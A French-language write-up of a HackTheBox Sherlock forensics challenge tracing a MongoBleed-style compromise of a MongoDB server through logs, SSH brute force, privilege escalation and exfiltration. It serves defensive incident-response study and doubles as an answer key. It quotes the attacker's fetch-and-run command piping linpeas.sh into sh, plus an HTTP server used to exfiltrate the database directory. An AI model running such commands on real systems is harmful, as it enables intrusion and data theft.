# MangoBleed - Write-up Sherlock HackTheBox

## Scénario

Incident prioritaire impliquant un serveur compromis.
L'hôte `mongodbsync` est un serveur MongoDB secondaire.
L'administrateur a mentionné une vulnérabilité appelée **MongoBleed**.
Une acquisition triage a été collectée avec UAC pour l'analyse forensique.

## Artefacts clés

L'analyse se concentre sur ces fichiers du triage UAC :
- `/var/log/mongodb/mongod.log` - Logs du serveur MongoDB
- `/var/log/auth.log` - Logs d'authentification SSH
- `/home/mongoadmin/.bash_history` - Historique des commandes de l'attaquant
- `/etc/mongod.conf` - Configuration MongoDB

---

## Tâche 1 : ID CVE de la vulnérabilité MongoDB

**Réponse** : `CVE-2024-12029`

MongoBleed est une vulnérabilité de divulgation mémoire dans MongoDB permettant à un attaquant de fuiter des informations sensibles via des séquences rapides de connexion/déconnexion.

---

## Tâche 2 : Version de MongoDB installée

**Réponse** : `8.0.16`

```bash
# Dans les logs MongoDB
grep -i "version" mongod.log | head -5

# Ou dans auth.log (commande d'installation)
grep "mongodb-org" auth.log
```

```json
{"msg":"Build Info","attr":{"buildInfo":{"version":"8.0.16"...}}}
```

---

## Tâche 3 : Adresse IP distante de l'attaquant

**Réponse** : `65.0.76.43`

```bash
# Chercher les connexions acceptées depuis des IPs externes
grep "Connection accepted" mongod.log | head -20

# Ou chercher les IPs uniques
grep -oP '"remote":"\K[0-9.]+' mongod.log | sort -u
```

---

## Tâche 4 : Date et heure du début de l'exploitation

**Réponse** : `2025-12-29 05:25:52`

```bash
# Première connexion de l'attaquant
grep "Connection accepted.*65.0.76.43" mongod.log | head -1
```

```json
{"t":{"$date":"2025-12-29T05:25:52.743+00:00"},"msg":"Connection accepted","attr":{"remote":"65.0.76.43:35340"}}
```

---

## Tâche 5 : Nombre total de connexions malveillantes

**Réponse** : `37630`

```bash
# Compter les connexions de l'attaquant
grep -c "Connection accepted.*65.0.76.43" mongod.log
```

Les connexions ont eu lieu entre `05:25:52` et `05:27:07` (~75 secondes), soit ~500 connexions/seconde - caractéristique d'un exploit de type "bleed".

---

## Tâche 6 : Quand l'attaquant a-t-il obtenu un accès distant interactif ?

**Réponse** : `2025-12-29 05:40:03`

```bash
# Chercher les connexions SSH réussies depuis l'IP de l'attaquant
grep "Accepted.*65.0.76.43" auth.log
```

```
2025-12-29T05:40:03 sshd[39962]: Accepted keyboard-interactive/pam for mongoadmin from 65.0.76.43 port 46062 ssh2
```

L'attaque par force brute a commencé à `05:39:18` :
```bash
# Voir les tentatives échouées
grep "authentication failure.*65.0.76.43" auth.log | head -10
```

---

## Tâche 7 : Ligne de commande pour le script d'élévation de privilèges en mémoire

**Réponse** : `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`

```bash
# Lire l'historique bash de l'attaquant
cat /home/mongoadmin/.bash_history
```

L'attaquant a utilisé linpeas.sh redirigé directement vers le shell pour éviter d'écrire sur le disque.

---

## Tâche 8 : Répertoire ciblé pour l'exfiltration

**Réponse** : `/var/lib/mongodb`

```bash
# Dans le bash_history, chercher les commandes cd et http.server
cat /home/mongoadmin/.bash_history | grep -E "cd|http"
```

```bash
cd /var/lib/mongodb/
python3 -m http.server 6969
```

---

## Chronologie

| Heure (UTC) | Événement |
|-------------|-----------|
| 05:11:47 | MongoDB 8.0.16 installé et démarré |
| 05:17:25 | Utilisateur `mongoadmin` créé |
| 05:25:52 | Exploitation MongoBleed commence (37630 connexions) |
| 05:27:07 | Fin de l'exploitation |
| 05:39:18 | Attaque brute-force SSH démarre |
| 05:40:03 | Attaquant obtient accès SSH comme `mongoadmin` |
| 05:42:03 | Tentative sudo échouée |
| 05:42:05 | Script linpeas de privilege escalation exécuté |
| ~05:45 | Exfiltration de données depuis /var/lib/mongodb |
| 05:48:28 | Attaquant se déconnecte |

---

## Analyse des causes

1. **Version MongoDB vulnérable** : 8.0.16 affectée par CVE-2024-12029
2. **Exposé sur internet** : MongoDB bindé sur `0.0.0.0` sans authentification
3. **Pas de configuration sécurité** : `#security:` commenté dans mongod.conf
4. **Mot de passe faible** : Le password de `mongoadmin` était probablement exposé via la fuite mémoire
